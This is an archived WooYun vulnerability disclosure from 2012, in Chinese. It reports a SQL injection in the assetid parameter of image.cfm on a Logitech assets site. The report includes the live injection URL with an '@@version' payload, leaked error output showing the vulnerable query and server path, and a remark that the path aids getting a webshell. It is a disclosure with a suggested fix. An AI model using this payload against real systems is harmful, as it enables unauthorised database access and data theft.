@@ -1,0 +1,169 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		罗技网站SQL注入，可能泄露使用者信息  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		罗技网站SQL注入，可能泄露使用者信息  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/asmc">asmc</a> 
+</li><li>提交时间：		2012-10-08 13:45</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-10-08：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-11-22：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">SQL注入，物理路径泄漏</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">漏洞位置在http://assets.logitech.com/login/是一个用户登录的页面，但是这个页面的中的背景图片是动态调用得到，具体URL是<br />
+<br />
+http://assets.logitech.com/login/image.cfm?x1=0&amp;y1=0&amp;x2=1&amp;y2=1&amp;format=&amp;width=../&amp;height=161&amp;assetid=73806%20and%201=@@version<br />
+<br />
+image.cfm未对参数assetid进行任何过滤，源代码暴漏了细节:<br />
+<br />
+</p><pre><code>The error occurred in D:\mediabank\login\image.cfm: line 17<br />
+Called from 64-bit) on Windows NT 6.1 (Build 7601: line -1<br />
+Called from 64-bit) on Windows NT 6.1 (Build 7601: line -1<br />
+Called from D:\mediabank\login\image.cfm: line 17<br />
+15 : 	&lt;CFQUERY NAME=&quot;GetAsset&quot; DATASOURCE=&quot;#datasource#&quot;&gt;<br />
+16 : 		SELECT * FROM MEDIA<br />
+17 : 		WHERE ID=#url.assetid#<br />
+18 : 	&lt;/CFQUERY&gt;<br />
+19 : 	&lt;CFMODULE NAME=&quot;V2.GETNODEPATH&quot; nodeID=&quot;#GetAsset.NODE_ID#&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+2 返回结果页面还包含了物理路径，为进一步获取权限(webshell)提供了重要信息<br />
+<br />
+<br />
+<br />
+审核人员看这里，看后删除谢谢（非常抱歉我提供提交过一次，由于第一次提交的内容有严重失误，提交后才明白过来，但是也没办法修改了，非常抱歉） </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/02012814370ed2ea5f4de7ed57900fbb0fa39357.jpg" target="_blank"><img src="../images/02012814370ed2ea5f4de7ed57900fbb0fa39357.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">验证参数类型，过滤敏感字符 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/asmc" title="asmc">asmc</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-012977" title="罗技网站SQL注入，可能泄露使用者信息">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="12977";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
